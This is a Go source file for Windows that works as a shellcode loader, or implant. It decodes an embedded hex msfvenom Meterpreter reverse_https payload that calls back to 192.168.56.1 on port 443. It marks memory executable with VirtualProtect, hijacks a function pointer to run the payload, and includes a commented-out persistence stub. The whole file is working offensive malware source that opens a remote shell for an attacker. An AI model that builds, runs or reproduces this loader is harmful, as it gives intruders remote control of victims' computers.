package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
	ret, _, _ := procVirtualProtect.Call(
		uintptr(lpAddress),
		uintptr(dwSize),
		uintptr(flNewProtect),
		uintptr(lpflOldProtect))
	return ret > 0
}

func Implant(sc []byte) {
	exec := func() {}

	var oldfperms uint32
	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&exec))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
		panic("Error")
	}

	**(**uintptr)(unsafe.Pointer(&exec)) = *(*uintptr)(unsafe.Pointer(&sc))

	var oldshellcodeperms uint32
	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
		panic("Error")
	}

	exec()
}

// func Persistence() {
// 	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
// 		panic("Error")
// 	}
// 	syscall.NewLazyDLL("C:\$windows\$system32\user32.dll").NewProc("VirtualProtect")
// 	// belum jadi
// }

func main() {
	// shellcode  msfvenom
	// $ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.56.1 LPORT=443 -f hex
	// [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
	// [-] No arch selected, selecting arch: x86 from the payload
	// No encoder or badchars specified, outputting raw payload
	// Payload size: 510 bytes
	// Final size of hex file: 1020 bytes
	// fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368bb010000e8e50000002f69474f352d2d32646f6251584a42596c5374735f38676e436a67716a6465624345666e59436e4b6e66386b4d737963365636344b6158485937684a41557671346e314b3656744b696f7642394332614e7174614c00506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e35362e3100bbf0b5a2566a0053ffd5
	// GOOS=windows GOARCH=386 go build -o bc.exe
	var (
		shellcode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353e83e0000004d6f7a696c6c612f352e30202857696e646f7773204e5420362e313b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f00683a5679a7ffd553536a03535368bb010000e8e50000002f69474f352d2d32646f6251584a42596c5374735f38676e436a67716a6465624345666e59436e4b6e66386b4d737963365636344b6158485937684a41557671346e314b3656744b696f7642394332614e7174614c00506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8490000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff3139322e3136382e35362e3100bbf0b5a2566a0053ffd5"
	)

	sc, err := hex.DecodeString(shellcode)
	if err != nil {
		fmt.Printf("Decoding err: %s\n", err)
		os.Exit(1)
	}
	Implant(sc)

}
